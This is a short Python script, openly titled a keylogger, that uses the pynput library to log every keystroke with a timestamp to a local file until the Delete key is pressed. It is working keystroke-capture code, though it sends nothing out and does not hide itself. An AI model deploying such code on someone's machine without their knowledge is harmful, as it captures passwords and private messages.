"""
    Keyboard Logger
    - Keylogger that monitor keystrokes

    Author : Kruze Zab [github hyperlink]
    Date : 1/10/21
"""

from pynput.keyboard import Key, Listener
import logging


logging.basicConfig(filename=("keylogs.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")


def on_press(key):
    '''
    action on key press
    '''
    pressed_key = str(key)
    print(pressed_key)
    logging.info(pressed_key)
    
def on_release(key):
    '''
    stop monitoring if 
    delete key is pressed
    '''
    if key == Key.delete:
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Start Listening
    listener.join()
